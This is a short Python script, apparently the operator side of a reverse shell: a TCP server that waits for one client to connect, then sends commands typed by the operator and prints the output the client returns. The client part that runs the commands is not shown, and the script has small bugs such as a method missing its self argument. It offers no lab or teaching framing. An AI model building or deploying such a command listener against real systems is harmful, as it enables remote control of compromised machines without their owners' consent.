from socket import *
import sys , subprocess

if sys.argv[1:]:
    HOST = sys.argv[1]
    PORT = int (sys.argv[2])

HOST = input(".HOST> ")
PORT = int (input(".PORT> "))

class Server():
    def __init__(self):
        self.sock = socket(AF_INET, SOCK_STREAM) # TCP SOCKET
        self.sock.bind((HOST, PORT))
        self.sock.listen() 
        print("[+] Server listening for incoming connections. ")
        self.clt, self.addr = self.sock.accept()
        print(f"[+] client ({self.addr}) connected to the server")

    def Terminal(self):
        prompt = self.clt.recv(1024).decode()
        while True:
            cmd = input(prompt).encode()
            if cmd:
                self.clt.send(cmd)
                size = int (self.clt.recv(1024))
                opt = self.clt.recv(1024 * size)
                print(opt.decode())

    def Start():
        try:
            Server().Terminal()
        except EOFError:
            print("Quitting")
        except OSError as e:
            print(f"ERROR : {e}")
            print("Addres is using somewhere \nUse some other address or kill the process from following command:\nnetstat -t <host:port> ")
        

Server.Start()
